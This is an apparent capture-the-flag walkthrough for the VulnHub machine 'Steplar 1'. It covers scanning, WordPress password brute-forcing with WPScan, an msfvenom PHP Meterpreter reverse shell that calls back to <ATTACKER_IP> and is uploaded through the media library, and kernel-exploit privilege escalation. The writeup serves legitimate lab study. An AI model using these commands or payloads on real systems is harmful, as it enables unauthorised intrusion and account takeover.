![Steplar Banner](images/banner.png)

```text
███████╗████████╗███████╗██████╗ ██╗      █████╗ ██████╗
██╔════╝╚══██╔══╝██╔════╝██╔══██╗██║     ██╔══██╗██╔══██╗
███████╗   ██║   █████╗  ██████╔╝██║     ███████║██████╔╝
╚════██║   ██║   ██╔══╝  ██╔═══╝ ██║     ██╔══██║██╔══██╗
███████║   ██║   ███████╗██║     ███████╗██║  ██║██║  ██║
╚══════╝   ╚═╝   ╚══════╝╚═╝     ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝
```

![OS](https://img.shields.io/badge/OS-Linux-green)
![Type](https://img.shields.io/badge/Type-VulnHub-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Intermediate-orange)
![Status](https://img.shields.io/badge/Status-Rooted-success)

---

## 🧠 Machine Information

| Item        | Value                  |
| ----------- | ---------------------- |
| Name        | Steplar 1              |
| Platform    | VulnHub                |
| Attacker OS | Parrot OS / Kali Linux |
| Goal        | Root the machine       |

---

## 🔍 Reconnaissance

Initial host discovery was performed using standard network scanning tools. The machine was reachable only when using a **Bridged Adapter**.

```bash
nmap -sn <network-range>
```

A web service was discovered on port **80**, indicating an HTTP server.

An aggressive scan revealed an additional open port:

```bash
nmap -p- -A -O -sV <TARGET_IP>
```

Open ports:

* **80/tcp** – HTTP
* **12380/tcp** – Apache HTTPD 2.4.18

---

## 🌐 Web Enumeration

Port 80 returned a default page with no useful information. The `robots.txt` file returned **404**.

Visiting the web service on port **12380** revealed an active website:

```text
http://<TARGET_IP>:12380
```

Source code inspection showed a comment:

```html
<!-- A message from the head of our HR department, Zoe, if you are looking at this, we want to hire you! -->
```

Directory brute forcing using **Gobuster** and **FFUF** yielded no results.

---

## 📡 FTP Enumeration

An FTP service was accessible without specifying a port. After login, a note file was discovered.

```bash
ftp <TARGET_IP>
ls
get note
```

The note hinted toward a payload-based attack, suggesting further exploitation paths.

---

## 🧪 Vulnerability Scanning

A **Nikto** scan revealed that HTTPS was enabled and exposed a valid `robots.txt` file.

```bash
nikto -h https://<TARGET_IP>:12380
```

Interesting paths discovered:

* `/admin112233`
* `/blogblog`
* `/phpmyadmin`

The `/blogblog` page revealed a **WordPress** installation.

---

## ⚔️ Exploitation (WordPress)

User enumeration revealed potential usernames such as **john**, **tim**, and **harry**.

A brute-force attack was launched using **WPScan**:

```bash
wpscan --url https://<TARGET_IP>:12380/blogblog \
--disable-tls-checks \
--usernames john \
--passwords rockyou.txt \
--password-attack wp-login
```

✅ Valid credentials found:

```text
john : incorrect
```

Successful login granted access to the WordPress dashboard.

---

## 🐚 Reverse Shell

Attempts to modify the 404 template failed due to permission restrictions.

A PHP reverse shell was generated using **msfvenom**:

```bash
msfvenom -p php/meterpreter/reverse_tcp LHOST=<ATTACKER_IP> LPORT=1234 -f raw > reverse.php
```

The payload was uploaded via WordPress media upload and executed from:

```text
/wp-content/uploads/reverse.php
```

A Meterpreter session was successfully established.

---

## ⬆️ Privilege Escalation

Initial enumeration did not reveal direct escalation paths.

The **Linux Exploit Suggester** was downloaded and executed:

```bash
wget https://raw.githubusercontent.com/The-Z-Labs/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

A suitable kernel exploit was identified and used to gain **root access**.

The flag was located in the root directory.

---

## 🏁 Conclusion

This machine emphasized:

* Network configuration awareness
* Web service enumeration
* WordPress exploitation
* Payload delivery techniques
* Kernel-based privilege escalation

---

## ⚠️ Disclaimer

This writeup is intended **strictly for educational purposes** and was performed in a legal lab environment.

---

### 👤 Author

**Jai Agrawal**
Cybersecurity | Pentesting | CTFs
